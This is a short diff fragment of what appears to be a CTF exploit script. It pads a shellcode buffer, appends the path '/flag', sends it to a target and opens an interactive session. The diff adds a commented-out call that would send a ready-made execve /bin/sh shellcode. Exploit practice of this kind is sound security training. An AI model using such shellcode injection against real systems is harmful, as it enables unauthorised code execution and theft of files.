@@ -71,4 +71,5 @@ code=code.ljust(0x160)
 code+=b'/flag\x00'
 
 s(code)
+# s(ShellcodeMall.amd64.execve_bin_sh)
 ia()
